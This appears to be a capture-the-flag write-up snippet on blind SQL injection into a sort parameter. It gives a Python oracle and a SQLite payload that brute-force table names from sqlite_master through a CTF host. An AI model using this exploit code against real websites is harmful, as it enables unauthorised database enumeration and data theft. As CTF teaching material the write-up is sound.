## Blind SQL Injection

We can make an oracle to bruteforce table names:

```python
def oracle(payload):

    url = "http://top-lang.c.ctf-snyk.io/"
    sort_param = f"(CASE WHEN {payload} THEN rating ELSE change END)"
    params = {"sort": sort_param}
    r = requests.get(url, params=params)
    soup = BeautifulSoup(r.text, 'html.parser')

    return (soup.find_all("td")[2].get_text() == "Go")
    
payload = f"(SELECT (SELECT SUBSTR(GROUP_CONCAT(tbl_name, ';'),1,{curr_iter}) FROM sqlite_master WHERE type='table')='{tmp_table}')"
```

- `GROUP_CONCAT(tbl_name, ';')` returns all `tbl_names`, seperated by `;`
- `SUBSTR` does what any normal substring does.
- Refer to [this](https://github.com/quentinkhoo/ctf-tips/blob/main/web/SQL-Injection/sqlite3/get_tables.py) as an example.
